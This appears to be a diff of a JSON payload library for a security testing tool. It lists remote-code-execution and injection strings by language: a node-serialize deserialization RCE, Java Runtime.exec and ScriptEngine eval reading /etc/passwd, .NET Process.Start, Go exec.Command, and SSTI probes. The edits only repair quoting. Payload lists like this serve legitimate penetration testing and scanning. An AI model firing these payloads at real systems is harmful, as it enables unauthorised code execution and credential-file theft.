@@ -103,7 +103,7 @@
                 ],
                 "deserialization": [
                     "const serialize = require('node-serialize'); const payload = \"{\\\"rce\\\": \\\"_$$ND_FUNC$$_function(){require('child_process').exec('id');}()\\\"}\"; serialize.unserialize(payload);",
-                    "const payload = '{\"rce\":\"_$$ND_FUNC$$_function(){return process.mainModule.require('child_process').exec('id');}()\"}'; require('node-serialize').unserialize(payload);"
+                    "const payload = \"{\\\"rce\\\":\\\"_$$ND_FUNC$$_function(){process.mainModule.require('child_process').exec('id');}()\\\"}\"; require('node-serialize').unserialize(payload);"
                 ]
             },
             "python": {
@@ -155,8 +155,8 @@
                     "Runtime.getRuntime().exec(\"whoami\")",
                     "new ProcessBuilder(\"whoami\").start()",
                     "Runtime.getRuntime().exec(\"cat /etc/passwd\")",
-                    "Process process = new ProcessBuilder().command('bash','-c','id').start();",
-                    "Runtime.getRuntime().exec(new String[]{'bash','-c','cat /etc/passwd'});"
+                    "Process process = new ProcessBuilder().command(\"bash\",\"-c\",\"id\").start();",
+                    "Runtime.getRuntime().exec(new String[]{\"bash\",\"-c\",\"cat /etc/passwd\"});"
                 ],
                 "freemarker_ssti": [
                     "${7*7}",
@@ -176,11 +176,11 @@
                 ],
                 "deserialization": [
                     "new ObjectInputStream(new ByteArrayInputStream(payload)).readObject(); // ysoserial gadget",
-                    "new ObjectInputStream(new FileInputStream('payload.bin')).readObject();"
+                    "new ObjectInputStream(new FileInputStream(\"payload.bin\")).readObject();"
                 ],
                 "expression": [
                     "javax.script.ScriptEngineManager m = new javax.script.ScriptEngineManager(); m.getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('id')\");",
-                    "new javax.script.ScriptEngineManager().getEngineByName('nashorn').eval(\"java.lang.Runtime.getRuntime().exec('cat /etc/passwd')\");"
+                    "new javax.script.ScriptEngineManager().getEngineByName(\"nashorn\").eval(\"java.lang.Runtime.getRuntime().exec('cat /etc/passwd')\");"
                 ]
             },
             "dotnet": {
@@ -188,8 +188,8 @@
                     "Process.Start(\"whoami.exe\")",
                     "Process.Start(\"cmd.exe\", \"/c whoami\")",
                     "new Process { StartInfo = new ProcessStartInfo { FileName = \"cmd.exe\", Arguments = \"/c whoami\" } }.Start()",
-                    "Process.Start(new ProcessStartInfo('cmd.exe'){Arguments='/c whoami',UseShellExecute=false,RedirectStandardOutput=true});",
-                    "System.Diagnostics.Process.Start('powershell.exe','-Command \"Get-Process\"');"
+                    "Process.Start(new ProcessStartInfo(\"cmd.exe\"){Arguments=\"/c whoami\",UseShellExecute=false,RedirectStandardOutput=true});",
+                    "System.Diagnostics.Process.Start(\"powershell.exe\",\"-Command \\\"Get-Process\\\"\");"
                 ],
                 "deserialize": [
                     "new BinaryFormatter().Deserialize(new MemoryStream(payload)); // Gadget execution",
@@ -226,8 +226,8 @@
                     "exec.Command(\"whoami\").Output()",
                     "exec.Command(\"bash\", \"-c\", \"whoami\").Output()",
                     "exec.Command(\"cat\", \"/etc/passwd\").Output()",
-                    "cmd := exec.Command('sh','-c','id'); out, _ := cmd.CombinedOutput(); string(out)",
-                    "exec.Command('powershell','-Command','whoami').Output()"
+                    "cmd := exec.Command(\"sh\",\"-c\",\"id\"); out, _ := cmd.CombinedOutput(); string(out)",
+                    "exec.Command(\"powershell\",\"-Command\",\"whoami\").Output()"
                 ]
             },
             "javascript": [
